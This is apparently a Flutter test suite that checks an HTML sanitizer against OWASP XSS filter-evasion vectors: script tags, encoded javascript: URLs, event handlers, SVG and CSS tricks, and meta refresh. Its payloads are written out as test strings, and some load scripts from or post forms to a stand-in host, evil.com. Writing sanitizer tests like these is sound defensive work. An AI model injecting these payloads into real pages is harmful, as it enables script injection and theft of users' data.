/// OWASP XSS Filter Evasion Test Suite
///
/// Tests HtmlSanitizer against OWASP XSS Filter Evasion Cheat Sheet vectors.
/// Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
///
/// This comprehensive test suite validates that HyperRender's sanitizer
/// properly blocks sophisticated XSS attack vectors.
library;

import 'package:flutter_test/flutter_test.dart';
import 'package:hyper_render_html/hyper_render_html.dart';

void main() {
  group('OWASP XSS Evasion Tests', () {
    group('Basic XSS Attacks', () {
      test('should block basic script tag', () {
        const attack = '<SCRIPT>alert("XSS")</SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block script tag with no quotes', () {
        const attack = '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('evil.com')));
      });

      test('should block img tag with javascript protocol', () {
        const attack = '<IMG SRC="javascript:alert(\'XSS\');">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // Image tag may remain, but javascript: should be stripped
        expect(sanitized, isNot(contains('javascript:')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block iframe injection', () {
        const attack = '<IFRAME SRC="http://evil.com/xss.html"></IFRAME>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('iframe')));
        expect(sanitized, isNot(contains('evil.com')));
      });
    });

    group('Case Manipulation Attacks', () {
      test('should block mixed-case script tag', () {
        const attack = '<ScRiPt>alert("XSS")</sCrIpT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized.toLowerCase(), isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block uppercase SCRIPT', () {
        const attack = '<SCRIPT>ALERT("XSS")</SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized.toLowerCase(), isNot(contains('script')));
      });

      test('should block mixed-case IMG with javascript', () {
        const attack = '<ImG sRc="JaVaScRiPt:alert(\'XSS\');">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized.toLowerCase(), isNot(contains('javascript:')));
      });
    });

    group('Encoded Attacks', () {
      test('should block HTML entity encoded script', () {
        const attack = '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(\'XSS\')>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // Sanitizer should handle or strip entity-encoded javascript:
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block hex encoded javascript', () {
        const attack = '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(\'XSS\')>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('alert')));
      });

      test('should block embedded tab in script', () {
        const attack = '<IMG SRC="jav\tascript:alert(\'XSS\');">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('alert')));
      });

      test('should block embedded newline in script', () {
        const attack = '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('alert')));
      });
    });

    group('Event Handler Attacks', () {
      test('should block onclick handler', () {
        const attack = '<IMG SRC="#" onclick="alert(\'XSS\')">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onclick')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block onerror handler', () {
        const attack = '<IMG SRC="invalid.jpg" onerror="alert(\'XSS\')">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onerror')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block onload handler', () {
        const attack = '<BODY ONLOAD=alert(\'XSS\')>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onload')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block onmouseover handler', () {
        const attack = '<IMG SRC="#" onmouseover="alert(\'XSS\')">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onmouseover')));
      });

      test('should block all on* event handlers', () {
        const eventHandlers = [
          'onclick', 'ondblclick', 'onmousedown', 'onmouseup',
          'onmouseover', 'onmousemove', 'onmouseout',
          'onkeydown', 'onkeypress', 'onkeyup',
          'onfocus', 'onblur', 'onchange', 'onsubmit',
          'onload', 'onerror', 'onabort',
        ];

        for (final handler in eventHandlers) {
          final attack = '<img src="#" $handler="alert(\'XSS\')">';
          final sanitized = HtmlSanitizer.sanitize(attack);

          expect(
            sanitized,
            isNot(contains(handler)),
            reason: 'Failed to block $handler',
          );
        }
      });
    });

    group('Protocol-based Attacks', () {
      test('should block javascript: protocol', () {
        const attack = '<A HREF="javascript:alert(\'XSS\')">Click</A>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('javascript:')));
      });

      test('should block vbscript: protocol', () {
        const attack = '<A HREF="vbscript:msgbox(\'XSS\')">Click</A>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('vbscript:')));
      });

      test('should block data: protocol with text/html', () {
        const attack = '<IFRAME SRC="data:text/html,<script>alert(\'XSS\')</script>"></IFRAME>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('iframe')));
      });

      test('should block data: protocol with base64', () {
        const attack = '<IMG SRC="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // data:text/html should be blocked
        expect(sanitized, isNot(contains('data:text/html')));
      });
    });

    group('SVG-based Attacks', () {
      test('should block SVG with embedded script', () {
        const attack = '<svg><script>alert("XSS")</script></svg>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block SVG with onload', () {
        const attack = '<svg onload="alert(\'XSS\')"></svg>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onload')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block data:image/svg+xml with script', () {
        const attack = '''
<IMG SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">
''';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // data:image/svg+xml should be blocked (SVG can contain scripts)
        expect(sanitized, isNot(contains('data:image/svg')));
      });
    });

    group('CSS-based Attacks', () {
      test('should block CSS expression()', () {
        const attack = '<DIV STYLE="width: expression(alert(\'XSS\'));">test</DIV>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('expression(')));
      });

      test('should block CSS with javascript:', () {
        const attack = '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">test</DIV>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('javascript:')));
      });

      test('should block CSS import with javascript', () {
        const attack = '<STYLE>@import\'javascript:alert("XSS")\';</STYLE>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // <style> tag should be removed entirely
        expect(sanitized, isNot(contains('style')));
        expect(sanitized, isNot(contains('@import')));
      });

      test('should block style tag with dangerous content', () {
        const attack = '''
<STYLE>
  BODY { background: url("javascript:alert('XSS')"); }
</STYLE>
''';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('style')));
        expect(sanitized, isNot(contains('javascript:')));
      });
    });

    group('Null Byte Attacks', () {
      test('should block null byte in tag name', () {
        const attack = '<SCR\x00IPT>alert("XSS")</SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('alert')));
        expect(sanitized, isNot(contains('\x00')));
      });

      test('should block null byte in attribute', () {
        const attack = '<IMG SRC="java\x00script:alert(\'XSS\')">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('alert')));
        expect(sanitized, isNot(contains('\x00')));
      });
    });

    group('Nested and Malformed Attacks', () {
      test('should block nested script tags', () {
        const attack = '<SCRIPT><SCRIPT>alert("XSS")</SCRIPT></SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block malformed script tag', () {
        const attack = '<SCRIPT/SRC="http://evil.com/xss.js"></SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('evil.com')));
      });

      test('should block script with extra open bracket', () {
        const attack = '<<SCRIPT>alert("XSS");//<</SCRIPT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should block unclosed script tag', () {
        const attack = '<SCRIPT SRC=http://evil.com/xss.js';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('evil.com')));
      });
    });

    group('Form-based Attacks', () {
      test('should block form tag', () {
        const attack = '<FORM ACTION="http://evil.com/steal.php"><INPUT TYPE="submit"></FORM>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('form')));
        expect(sanitized, isNot(contains('input')));
      });

      test('should block input tag', () {
        const attack = '<INPUT TYPE="text" VALUE="<script>alert(\'XSS\')</script>">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('input')));
      });

      test('should block button with onclick', () {
        const attack = '<BUTTON onclick="alert(\'XSS\')">Click</BUTTON>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('onclick')));
        expect(sanitized, isNot(contains('alert')));
      });
    });

    group('Link and Anchor Attacks', () {
      test('should block link tag', () {
        const attack = '<LINK REL="stylesheet" HREF="http://evil.com/xss.css">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('link')));
      });

      test('should block base tag', () {
        const attack = '<BASE HREF="http://evil.com/">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('base')));
      });

      test('should preserve safe anchor but strip dangerous href', () {
        const attack = '<A HREF="javascript:alert(\'XSS\')">Click me</A>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // Anchor may remain but href should be stripped or cleaned
        expect(sanitized, isNot(contains('javascript:')));
        expect(sanitized, isNot(contains('alert')));
      });
    });

    group('Object and Embed Attacks', () {
      test('should block object tag', () {
        const attack = '<OBJECT TYPE="text/x-scriptlet" DATA="http://evil.com/xss.html"></OBJECT>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('object')));
        expect(sanitized, isNot(contains('evil.com')));
      });

      test('should block embed tag', () {
        const attack = '<EMBED SRC="http://evil.com/xss.swf" AllowScriptAccess="always"></EMBED>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('embed')));
        expect(sanitized, isNot(contains('evil.com')));
      });

      test('should block applet tag', () {
        const attack = '<APPLET CODE="XSS.class" CODEBASE="http://evil.com/"></APPLET>';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('applet')));
      });
    });

    group('Meta Tag Attacks', () {
      test('should block meta refresh', () {
        const attack = '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('meta')));
        expect(sanitized, isNot(contains('javascript:')));
      });

      test('should block meta with URL', () {
        const attack = '<META HTTP-EQUIV="refresh" CONTENT="0;url=http://evil.com/">';
        final sanitized = HtmlSanitizer.sanitize(attack);

        expect(sanitized, isNot(contains('meta')));
      });
    });

    group('Comprehensive Attack Vectors', () {
      test('should block multiple attack vectors in same HTML', () {
        const attack = '''
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<a href="javascript:alert('XSS')">Click</a>
<iframe src="http://evil.com"></iframe>
<object data="http://evil.com/xss.swf"></object>
<embed src="http://evil.com/xss.swf">
<style>@import'javascript:alert("XSS")';</style>
<link rel="stylesheet" href="http://evil.com/xss.css">
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
''';
        final sanitized = HtmlSanitizer.sanitize(attack);

        // All dangerous elements should be removed
        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('onerror')));
        expect(sanitized, isNot(contains('javascript:')));
        expect(sanitized, isNot(contains('iframe')));
        expect(sanitized, isNot(contains('object')));
        expect(sanitized, isNot(contains('embed')));
        expect(sanitized, isNot(contains('style')));
        expect(sanitized, isNot(contains('link')));
        expect(sanitized, isNot(contains('meta')));
        expect(sanitized, isNot(contains('alert')));
        expect(sanitized, isNot(contains('evil.com')));
      });

      test('should preserve safe HTML while blocking attacks', () {
        const mixed = '''
<p>This is safe text</p>
<script>alert('XSS')</script>
<h1>Safe heading</h1>
<img src="x" onerror="alert('XSS')">
<a href="https://example.com">Safe link</a>
<a href="javascript:alert('XSS')">Unsafe link</a>
''';
        final sanitized = HtmlSanitizer.sanitize(mixed);

        // Safe content should remain
        expect(sanitized, contains('This is safe text'));
        expect(sanitized, contains('Safe heading'));
        expect(sanitized, contains('Safe link'));

        // Attacks should be removed
        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('onerror')));
        expect(sanitized, isNot(contains('javascript:')));
        expect(sanitized, isNot(contains('alert')));
      });
    });

    group('Edge Cases and Stress Tests', () {
      test('should handle empty string', () {
        expect(() => HtmlSanitizer.sanitize(''), returnsNormally);
      });

      test('should handle very long attack string', () {
        final longAttack = '<script>${'A' * 10000}alert("XSS")</script>';
        final sanitized = HtmlSanitizer.sanitize(longAttack);

        expect(sanitized, isNot(contains('script')));
        expect(sanitized, isNot(contains('alert')));
      });

      test('should handle deeply nested safe HTML', () {
        const nested = '<div><div><div><p>Safe text</p></div></div></div>';
        final sanitized = HtmlSanitizer.sanitize(nested);

        expect(sanitized, contains('Safe text'));
      });

      test('should handle special characters in text content', () {
        const special = '<p>Text with &lt;, &gt;, &amp;, &quot;</p>';
        final sanitized = HtmlSanitizer.sanitize(special);

        expect(sanitized, contains('Text with'));
        // HTML entities should be preserved
      });
    });
  });

  group('OWASP XSS Evasion - Performance Tests', () {
    test('should sanitize 100 attack vectors within reasonable time', () {
      final attacks = List.generate(100, (i) => '<SCRIPT>alert("XSS$i")</SCRIPT>');

      final stopwatch = Stopwatch()..start();
      for (final attack in attacks) {
        HtmlSanitizer.sanitize(attack);
      }
      stopwatch.stop();

      // Should complete in under 1 second for 100 attacks
      expect(stopwatch.elapsedMilliseconds, lessThan(1000),
          reason: 'Sanitization too slow: ${stopwatch.elapsedMilliseconds}ms for 100 vectors');
    });

    test('should handle concurrent sanitization calls', () async {
      final attacks = [
        '<SCRIPT>alert("XSS1")</SCRIPT>',
        '<IMG SRC=x onerror="alert(\'XSS2\')">',
        '<A HREF="javascript:alert(\'XSS3\')">Click</A>',
      ];

      final futures = attacks.map((attack) =>
        Future(() => HtmlSanitizer.sanitize(attack))
      );

      final results = await Future.wait(futures);

      for (final result in results) {
        expect(result, isNot(contains('alert')));
        expect(result, isNot(contains('javascript:')));
      }
    });
  });
}
